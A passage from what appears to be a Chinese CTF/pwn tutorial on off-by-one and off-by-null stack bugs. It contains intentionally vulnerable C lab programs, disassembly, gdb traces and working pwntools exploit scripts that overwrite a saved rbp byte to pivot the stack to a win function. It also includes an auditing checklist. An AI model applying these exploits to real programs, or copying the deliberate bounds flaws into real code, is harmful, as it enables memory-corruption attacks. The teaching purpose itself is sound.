    getchar();                          /* 吃掉 %d 留下的换行 */
    printf("data> ");
    for (i = 0; i <= n; i++)            /* i <= n：多写一格 */
        buf[i] = getchar();
}

int main(void) {
    setbuf(stdout, NULL);
    char big[1024];
    printf("frame> ");
    read(0, big, sizeof(big));          /* 第一段输入：7.2 节预铺的假帧数据 */
    vuln();
    return 0;
}
```

检查存在（n > 64 拒绝），边界写错（`i <= n` 循环体执行 n+1 次）。反汇编里它就是循环尾部那条 `jle`：

```asm
; x86-64 Linux / System V AMD64 ABI（objdump -d -M intel obo，vuln 与 main 尾部）
  40121a:  8b 05 2c 2e 00 00    	mov    eax,DWORD PTR [rip+0x2e2c]        # 40404c <n>
  401220:  83 f8 40             	cmp    eax,0x40                          ; n 与 64 比
  401223:  7e 0c             	jle    401231 <vuln+0x46>                ; ≤ 64 放行
  ...
  401251:  e8 8a fe ff ff       	call   4010e0 <getchar@plt>
  401256:  89 c2             	mov    edx,eax                           ; 读到的字符
  401258:  8b 05 f2 2d 00 00    	mov    eax,DWORD PTR [rip+0x2df2]        # 404050 <i>
  40125e:  48 98             	cdqe                                     ; i 符号扩展进 rax
  401260:  88 54 05 c0          	mov    BYTE PTR [rbp+rax*1-0x40],dl      ; buf[i]，buf 在 rbp-0x40
  ...
  401273:  8b 15 d7 2d 00 00    	mov    edx,DWORD PTR [rip+0x2dd7]        # 404050 <i>
  401279:  8b 05 cd 2d 00 00    	mov    eax,DWORD PTR [rip+0x2dcd]        # 40404c <n>
  40127f:  39 c2             	cmp    edx,eax                           ; i 与 n 比
  401281:  7e ce             	jle    401251 <vuln+0x66>                ; i <= n：多跑一圈
  401283:  c9                   	leave
  401284:  c3                   	ret
```

`buf` 恰好从 `rbp-0x40` 开始、64 字节后紧贴 `rbp`——所以 `buf[64]` 这"多写的一格"正是==保存的 rbp 的最低字节==。n = 64 时发送 64 字节数据加 1 个字节，最后那个字节写进了谁，gdb 断在 `leave`（0x401283）拍下来看：

```
Breakpoint 1, 0x0000000000401283 in vuln ()
$1 = 0x7fffffffdd70
0x7fffffffdd70:	0x00007fffffffe141	0x00000000004012d5
```

`[rbp]` 处保存的 rbp 变成 0x7fffffffe141——原本的低字节被 0x41 顶掉；`[rbp+8]` 的返回地址 0x4012d5 完好。函数照常 `leave; ret` 回到 main，==被改过的 rbp 传给了 main==：main 收尾也要 `leave; ret`（尾部反汇编如下），leave 是"mov rsp,rbp 再 pop rbp"（[[R03-x86与x64汇编精要复习#3.4 call、ret 与 leave|R03 3.4]]），它会把被改过的 rbp 当真值用：

```asm
; main 尾部（obo）
  4012d0:  e8 16 ff ff ff       	call   4011eb <vuln>
  4012d5:  b8 00 00 00 00       	mov    eax,0x0
  4012da:  c9                   	leave                                   ; mov rsp,rbp 再 pop rbp
  4012db:  c3                   	ret
```

运行效果：

```bash
./obo < in_obo_effect.bin; echo "rc=$?"    # 输入：64 字节 B + 1 字节 0x41
```

输出：

```
frame> n> data>
rc=139
```

```bash
./obo < in_obo_clean.bin; echo "rc=$?"     # 对照：n=63，不多写这一格
```

输出：

```
frame> n> data>
rc=0
```

多写一格，程序停在 main 的收尾并触发段错误（rc=139 = 128 + 11，SIGSEGV）；不多写，干净退出。出错点在 main 的 `ret` 而不是 vuln 里——被改的 rbp 在 main 的 leave 处把 rsp 带到了错误的地方，ret 弹出的是栈上残留的 0x4141414141414141。

### 7.2 精确利用：改 rbp 低位完成栈迁移

只改一个字节，返回地址纹丝不动——还能拿 flag 吗？能，思路是把 rbp 的低字节改成"恰好指向我们提前铺好的数据"，让 main 的 `leave; ret` 完成一次==最小型的栈迁移==（完整版迁移手段 [[P08-ROP进阶与SROP|P8]] 展开；"只改低位字节"的思路与 [[P11-Canary绕过与GOT攻击|P11]] 的部分覆盖相通）。三步：

第一步，铺数据。main 的 `big[1024]`（位于 `rbp-0x400` 到 `rbp` 之间）先灌满 16 字节周期的重复模式：8 字节假 rbp（值随意，取 0xdead0000）加 8 字节 win 地址。这样缓冲区内==任何 16 对齐的位置 N==，`[N]` 都是假 rbp、`[N+8]` 都是 win。

第二步，算落点。设 M 为 main 的 rbp（帧基址），被改后的 rbp 值为：

$$N = M - (M \bmod 256) \tag{10.3}$$

把低 8 位清成 0（写入的那 1 字节取 0x00）。M 与 buf 的距离由帧布局定死（main 的帧在 vuln 之上，buf = M − 0x450 一带），与 ASLR 无关；M 按 16 字节对齐，所以 N 落在 `[M−255, M]` 里——除"M 恰好对齐 256 边界"这一种情形外，N 都落在 big 的数据里。

第三步，触发。n = 64，发送 64 字节填充加 1 字节 0x00：

```python
#!/usr/bin/env python3
# exp_obo.py —— 多写的一格落在 saved rbp 低字节上，借 main 的 leave;ret 迁移
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

WIN = 0x4011d6        # nm obo | grep win

io = process('./obo')
io.recvuntil(b'frame> ')
io.send((p64(0xdead0000) + p64(WIN)) * 64)    # big[1024]：16 字节周期铺满假帧
io.recvuntil(b'n> ')
io.sendline(b'64')
io.recvuntil(b'data> ')
io.send(b'B' * 64 + b'\x00')                  # 第 65 字节写到 buf[64] = saved rbp 低字节
print(io.recvline().decode().strip())
io.close()
```

输出：

```
flag{p10_obo_done}
```

执行流逐步拆开：

| 步 | 发生了什么 |
| ---- | ---- |
| 1 | vuln 的 leave：mov rsp,rbp 再 pop rbp——弹出被改过的值，rbp = N（指向 big 内部）；ret 弹出完好的返回地址回 main |
| 2 | main 收尾 leave：mov rsp,rbp——rsp 被搬到 N；pop rbp 弹出假 rbp；ret 弹出 `[N+8]` = win，跳进去 |
| 3 | win 执行 puts 打出 flag；它自己的 ret 弹到 0xdead0000 段错误收场——flag 已到手 |

==返回地址一个字节都没碰，控制流照样被改写==——这一格字节的威力全靠"rbp 链是 leave 的原料"（[[R02-C语言与内存模型回顾#3. 用 GDB 把栈帧看在眼里|R02 第 3 节]]画过的那条链）。

> [!info]- 成功率与两个前提
> 其一，N = M 的特例：M 对齐在 256 边界时（M 按 16 对齐，16 种取值里 1 种，概率 1/16），清零低字节等于没改，rbp 原样传回，程序正常退出、没有 flag——重跑一次即可。其二，本章程序没有开栈保护（`-fno-stack-protector`）；Canary 在场时，覆盖 saved rbp 低字节 ==不会== 触发 Canary 检查（Canary 只挡返回地址方向的覆盖），这正是这类缺陷在全保护程序里依然被研究的原因，[[P11-Canary绕过与GOT攻击|P11]] 展开。

### 7.3 这一格从哪来

`i <= n` 只是最高产的来源。同族的还有：`fgets(buf, n+1, fp)`——第二个参数是"总容量"，给成"元素个数 + 1"，fgets 就会往 n 字节的缓冲区里写 n 个字符再补 `\0`，第 n+1 字节出界。共性：==边界差一不报错、不崩溃，出界的那个字节无声地落在邻近数据上==；后果取决于相邻位置存的是什么——在栈上撞见 saved rbp 低位，就是 7.2 的打法。

## 8. off-by-null：收尾 \0 多写的一格

字符串函数要给结果补结尾的 `\0`，这个补写动作自己就可能出界。栈上的形态与 7.1 同源：64 字节的 buf 紧贴 rbp 时，第 65 字节的 `\0` 把保存的 rbp 低字节压成 0。

### 8.1 漏洞代码

```c
/* obnull.c —— strcpy 的收尾 \0 多写一格（x86-64 Linux） */
#include <stdio.h>
#include <string.h>
#include <unistd.h>

void win(void) {
    puts("flag{p10_obnull_done}");
}

void vuln(void) {
    char buf[64];
    char src[65];
    printf("data> ");
    if (fgets(src, sizeof(src), stdin) == NULL)  /* 最多 64 字符 + \0 */
        return;
    strcpy(buf, src);                   /* 复制 strlen(src)+1 字节：多出的正是 \0 */
}

int main(void) {
    setbuf(stdout, NULL);
    char big[1024];
    printf("frame> ");
    read(0, big, sizeof(big));          /* 第一段输入：8.3 节预铺的假帧数据 */
    vuln();
    return 0;
}
```

程序员的心思是周全的：src 开 65 字节，fgets 最多读 64 字符加 `\0`，不会溢 src。疏漏在下一步——strcpy 复制的是 `strlen(src)+1` 字节（含结尾 `\0`），送进 64 字节的 buf。输入恰好 64 个非零字节时，复制 65 字节，最后那个 `\0` 落在 `buf[64]`。反汇编确认落点：

```asm
; x86-64 Linux / System V AMD64 ABI（objdump -d -M intel obnull，vuln 节选）
  401229:  48 8d 95 70 ff ff ff 	lea    rdx,[rbp-0x90]            ; src
  401230:  48 8d 45 c0          	lea    rax,[rbp-0x40]            ; buf，紧贴 rbp
  401234:  48 89 d6             	mov    rsi,rdx
  401237:  48 89 c7             	mov    rdi,rax
  40123a:  e8 51 fe ff ff       	call   401090 <strcpy@plt>
```

### 8.2 一字节的对照

同样的断点（vuln 的 `leave`，0x401242），两种输入各拍一张：

```
Breakpoint 1, 0x0000000000401242 in vuln ()
$1 = 0x7fffffffdd60
0x7fffffffdd60:	0x00007fffffffe170	0x0000000000401294
[Inferior 1 (process 4151) exited normally]
```

62 字节加换行：strcpy 复制 64 字节，恰好装满 buf，保存的 rbp（0x7fffffffe170）完好，程序正常退出。输入换成 64 个非零字节：

```
Breakpoint 1, 0x0000000000401242 in vuln ()
$1 = 0x7fffffffdd60
0x7fffffffdd60:	0x00007fffffffe100	0x0000000000401294

Program received signal SIGSEGV, Segmentation fault.
0x000000000040129a in main ()
rsp            0x7fffffffe108      0x7fffffffe108
0x7fffffffe108:	0x4141414141414141
```

多出的 `\0` 把 0x...170 压成 0x...100——==低字节归零，其余不变==。返回地址 0x401294 完好，vuln 正常返回；main 收尾的 leave;ret 拿着被改的 rbp 把 rsp 搬去 0x7fffffffe100，ret 弹出栈上残留的 A，段错误。与 7.1 对照：off-by-one 可以把低字节改成任意值，off-by-null 只能归零——==自由度换成一个固定的 0x00，缺陷却更常见==（字符串函数遍地都是）。

### 8.3 完整利用

归零恰好就是 7.2 需要的那个字节。同一个程序，先给 big[1024] 铺同样的 16 字节周期假帧，再喂 64 个非零字节：

```python
#!/usr/bin/env python3
# exp_obnull.py —— strcpy 的收尾 \0 压掉 saved rbp 低字节
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

WIN = 0x4011d6        # nm obnull | grep win

io = process('./obnull')
io.recvuntil(b'frame> ')
io.send((p64(0xdead0000) + p64(WIN)) * 64)    # 假帧数据同 exp_obo
io.recvuntil(b'data> ')
io.send(b'C' * 64)                            # 64 字节非 0：\0 落在 buf[64]
print(io.recvline().decode().strip())
io.close()
```

输出：

```
flag{p10_obnull_done}
```

> [!warning] strncpy 的 \0 语义和 strcpy 不一样
> `strncpy(dst, src, n)` 只有在 `strlen(src) < n` 时才补 `\0`，而且会一路用 `\0` 填满剩余空间；src 长度 ≥ n 时==一个 `\0` 都不写==——拷出去的字符串没有结尾。两种行为各对应一类缺陷：前者多写（dst 需要 n 字节余量），后者少写（下游按字符串读就越界读）。`fgets` 的容量参数、`strcpy` 的隐式补 0、`strncpy` 的条件补 0，三个函数三个规矩，[[P02-前置基础C汇编与Linux|P2]] 的函数清单配过对照。

堆上的 off-by-null 是另一个量级的武器：写进下一个堆块头部的那个 `\0` 能篡改尺寸字段，由此发展出的 poisoned null byte 一族打法在基础堆漏洞一章（P13）正式展开，这里先把"补 \0 可以出界一格"这个根子记住。

## 9. 审计视角：读伪代码时盯什么

前八节汇聚成一张对照表——反汇编里的证据形状到源码缺陷的映射。IDA / Ghidra 的伪代码会给变量标类型（`unsigned int`、`_BYTE`、`__int64`），那是第一线索；两条证据链互相印证（类型看扩展指令，比较看跳转族别，[[R02-C语言与内存模型回顾#8.3 转换点在反汇编里的样子|R02 8.3]]）：

| 反汇编证据 | 对应的源码缺陷 | 出处 |
| ---- | ---- | ---- |
| 比较配 `jg`/`jle` 一族，长度却进了 read/memcpy | 有符号检查挡不住"经无符号路径"的巨大值 | 第 2 节 |
| `movsxd` / `movsx` 出现在长度送进消费者之前 | 负值被符号扩展成巨大长度 | 第 2、6 节 |
| `mov eax,eax`（或直接写 32 位子寄存器）后接 64 位比较 | 无符号零扩展：检查的是 32 位无符号语义 | 第 3 节 |
| `sub` 算"剩余空间"、结果再作上限 | 减法下溢，上限回绕成天文数字 | 第 3 节 |
| `mov WORD PTR`/`mov BYTE PTR` 窄存储 + 检查读回的是窄槽 | 截断：检查小值、使用原值 | 第 4 节 |
| `imul` 32 位乘积直接作总量上限 | 乘法回绕：检查值与实际工作量脱节 | 第 5 节 |
| 循环尾部 `cmp i,n` 配 `jle`/`jbe` | 边界差一：多写一格 | 第 7 节 |
| `call strcpy`/`strncpy` 的 dst 紧邻 saved rbp | 补 `\0` 出界一格 | 第 8 节 |

对着伪代码逐条问的问题清单：

1. **比较符号的完备性**：长度检查对负数、0、巨大值三个方向各是什么裁决？`len > 0 && len <= N` 挡得住负数，`len <= N` 挡不住。
2. **类型宽度过了几遍**：同一个长度，检查时什么类型、使用时什么类型？中间存进没存进更窄或无符号的变量？==两边类型不同，检查就不是同一件事的检查==。
3. **算式的隐性回绕**：长度相关表达式里有没有 `-=`、`*=`、`b - a`、`count * size`？无符号运算回绕不报错（10.1、10.2 两式），有符号溢出在优化下还可能被编译器当作不发生（[[R02-C语言与内存模型回顾#8.2 有符号溢出与无符号回绕|R02 8.2]]）。
4. **边界 `<=` 还是 `<`**：循环和比较的等号多一个，写入就多一格；缓冲区恰好紧贴 saved rbp 时，这一格就是控制权。
5. **第一条消费者是谁**：巨大长度流向 read/write 这类内核函数会被区间检查拦下（第 2、6 节），流向 memcpy、循环写入、下标则畅通无阻——==缺陷的可利用性由消费者决定==。
6. **阈值与缓冲区对没对上**：检查存在且比较方向正确还不够，第 3 节的 512 对 256 说明==阈值本身也要核==。

## 10. 常见问题

| 现象 | 原因与解决 |
| ---- | ---- |
| payload 一次全发，程序卡住不执行 | scanf（stdio）把整批输入吸进缓冲区，后面的 `read(0,...)` 在等新数据；按程序提示符分两次发（第 2 节的 info 框，[[P06-栈溢出原理与ret2win#7. 输入函数与 payload：gets 与 read 的差别\|P6 第 7 节]]） |
| 发了负数长度，程序不崩也没 flag，got = -1 | 64 位内核的区间检查拦下了符号扩展出的巨大 count（2.4 节）；找 unsigned 中转、截断路径，或确认目标是不是 32 位 |
| off 填 264 打不中返回地址 | buf 的落点以反汇编为准：本题 buf 在 `rbp-0x110`，返回地址在 buf+280；别的程序偏移不同 |
| trunc 输入 65576，got 却只有 96 | read 的 count 是上限、返回值是实际读到的；管道里只有 96 字节就收 96 字节，够覆盖返回地址即可 |
| mulwrap 打完 flag 前程序行为怪异 | payload 顺手覆盖了循环变量 i 的栈槽（5.3 节）；给每个被覆盖的槽安排好覆盖后的值 |
| off-by-one 打完程序正常退出、没有 flag | M 对齐在 256 边界（概率 1/16），清零低字节等于没改，重跑一次（7.2 节 info 框） |
| 照抄别人的低字节值在自己机器上不生效 | 帧布局由编译器版本与选项决定，偏移和落点没有公式（[[R02-C语言与内存模型回顾#3. 用 GDB 把栈帧看在眼里\|R02 第 3 节]]同款提醒） |
| strncpy 拷出的字符串没有结尾 | src 长度 ≥ n 时 strncpy 不补 `\0`（8.3 节 warning 框） |
| 编译这些漏洞程序没有任何警告 | 默认警告集不含 `-Wsign-conversion`/`-Wconversion`；显式加上才提示隐式转换（2.2、4.2 节） |
| 伪代码里变量全是 int，看不出符号 | 反编译器的类型标注只是猜测；用扩展指令（movsx/movzx）与跳转族别（jg/ja）两条证据链自证（第 9 节表） |

